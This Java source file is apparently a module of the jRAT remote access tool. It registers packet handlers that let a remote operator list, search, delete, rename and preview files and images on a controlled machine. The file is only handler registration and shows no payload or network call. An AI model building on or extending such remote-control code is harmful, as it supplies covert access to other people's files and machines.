package jrat.module.fs;

import jrat.api.ClientModule;
import jrat.client.packets.incoming.IncomingPackets;
import jrat.module.fs.packets.*;

public class FileSystemClientModule extends ClientModule {

    public void init() throws Exception {
        IncomingPackets.register((short) 15, Packet15ListFiles.class);
        IncomingPackets.register((short) 53, Packet53StartSearch.class);
        IncomingPackets.register((short) 54, Packet54StopSearch.class);
        IncomingPackets.register((short) 16, Packet16DeleteFile.class);
        IncomingPackets.register((short) 47, Packet47RenameFile.class);
        IncomingPackets.register((short) 60, Packet60PreviewFile.class);
        IncomingPackets.register((short) 85, Packet85ThumbnailPreview.class);
        IncomingPackets.register((short) 62, Packet62PreviewImage.class);
        IncomingPackets.register((short) 63, Packet63PreviewArchive.class);
        IncomingPackets.register((short) 41, Packet41SpecialDirectory.class);

    }
}
